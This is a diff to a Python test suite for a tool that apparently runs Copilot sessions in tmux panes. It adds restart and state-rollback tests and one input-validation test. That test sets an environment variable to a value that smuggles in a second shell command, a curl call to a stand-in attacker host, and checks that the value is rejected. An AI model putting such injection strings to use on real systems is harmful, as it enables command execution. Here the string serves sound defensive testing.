@@ -1156,6 +1156,12 @@ class TestGetCopilotModel:
         monkeypatch.setattr("duo.commander.get_config", lambda k: "custom-model")
         assert _get_copilot_model() == "custom-model"
 
+    def test_env_var_invalid_chars_rejected(self, monkeypatch: pytest.MonkeyPatch):
+        """Env var with shell-unsafe chars is rejected, falls back to config."""
+        monkeypatch.setenv("DUO_COPILOT_MODEL", "x; curl evil.com")
+        monkeypatch.setattr("duo.commander.get_config", lambda k: "safe-model")
+        assert _get_copilot_model() == "safe-model"
+
 
 # ---------------------------------------------------------------------------
 # start_session — error paths
@@ -1246,6 +1252,7 @@ class TestStartSessionError:
                 "duo.commander.start_session",
                 side_effect=RuntimeError("tmux died"),
             ),
+            patch("duo.commander.kill_pane", return_value=True),
             patch("duo.commander.time.sleep"),
         ):
             with pytest.raises(RuntimeError, match="tmux died"):
@@ -1469,8 +1476,9 @@ class TestResendLastPrompt:
 
 
 class TestRestartSession:
+    @patch("duo.commander.kill_pane", return_value=True)
     @patch("duo.commander.start_session")
-    def test_restart_clears_bootstrap(self, mock_start):
+    def test_restart_clears_bootstrap(self, mock_start, mock_kill):
         """restart_session discards pane from _BOOTSTRAP_DONE."""
         from duo.transport import _BOOTSTRAP_DONE, clear_bootstrap_done
 
@@ -1481,10 +1489,12 @@ class TestRestartSession:
 
         assert task.pane_label not in _BOOTSTRAP_DONE
         mock_start.assert_called_once_with(task)
+        mock_kill.assert_called_once_with(task.pane_label)
         clear_bootstrap_done(task.pane_label)  # cleanup
 
+    @patch("duo.commander.kill_pane", return_value=True)
     @patch("duo.commander.start_session")
-    def test_restart_resets_incarnation(self, mock_start):
+    def test_restart_resets_incarnation(self, mock_start, mock_kill):
         """restart_session generates a new incarnation ID."""
         task = _make_task()
         old_inc = task.incarnation_id
@@ -1493,8 +1503,9 @@ class TestRestartSession:
 
         assert task.incarnation_id != old_inc
 
+    @patch("duo.commander.kill_pane", return_value=True)
     @patch("duo.commander.start_session")
-    def test_restart_preserves_attempt(self, mock_start):
+    def test_restart_preserves_attempt(self, mock_start, mock_kill):
         """restart_session preserves current_attempt (correction context)."""
         task = _make_task()
         task.current_attempt = 3
@@ -1503,8 +1514,9 @@ class TestRestartSession:
 
         assert task.current_attempt == 3
 
+    @patch("duo.commander.kill_pane", return_value=True)
     @patch("duo.commander.start_session")
-    def test_restart_logs_event(self, mock_start):
+    def test_restart_logs_event(self, mock_start, mock_kill):
         """restart_session logs session_restarted event with old/new incarnation."""
         task = _make_task()
         old_inc = task.incarnation_id
@@ -3062,3 +3074,54 @@ class TestPollTaskEdgeCases:
 
         assert ret == PollResult.RESULT_READY
         mock_verify.assert_not_called()
+
+
+# ---------------------------------------------------------------------------
+# verify_and_advance — rollback on send failure
+# ---------------------------------------------------------------------------
+
+
+class TestVerifyAndAdvanceRollback:
+    """Tests for state rollback when send_task_prompt fails."""
+
+    def _write_result(self, task, step, attempt, status="done", **extra):
+        result_path = task.result_path(step, attempt)
+        result_path.parent.mkdir(parents=True, exist_ok=True)
+        data = {
+            "step": step,
+            "attempt": attempt,
+            "incarnation": task.incarnation_id,
+            "status": status,
+            **extra,
+        }
+        write_json(result_path, data)
+
+    @patch("duo.commander.send_task_prompt", side_effect=RuntimeError("pane dead"))
+    @patch("duo.commander.verify_step", return_value=Pass())
+    def test_continuation_send_failure_rolls_back_step(self, mock_verify, mock_send):
+        """If send_task_prompt fails on continuation, step/attempt are rolled back."""
+        task = _make_task(subtasks=[_make_subtask(1), _make_subtask(2)])
+        _advance_to_prompt_sent(task)
+        self._write_result(task, 1, 1)
+
+        verify_and_advance(task)
+
+        # Step should be rolled back to original
+        assert task.current_step == 1
+        assert task.current_attempt == 1
+        assert task.status == TaskStatus.BLOCKED
+
+    @patch("duo.commander.send_task_prompt", side_effect=OSError("transport error"))
+    @patch("duo.commander.verify_step")
+    def test_correction_send_failure_rolls_back_attempt(self, mock_verify, mock_send):
+        """If send_task_prompt fails on correction, attempt is rolled back."""
+        mock_verify.return_value = Correction("test failure")
+        task = _make_task()
+        _advance_to_prompt_sent(task)
+        self._write_result(task, 1, 1)
+
+        verify_and_advance(task)
+
+        # Attempt should be rolled back to original
+        assert task.current_attempt == 1
+        assert task.status == TaskStatus.FAILED
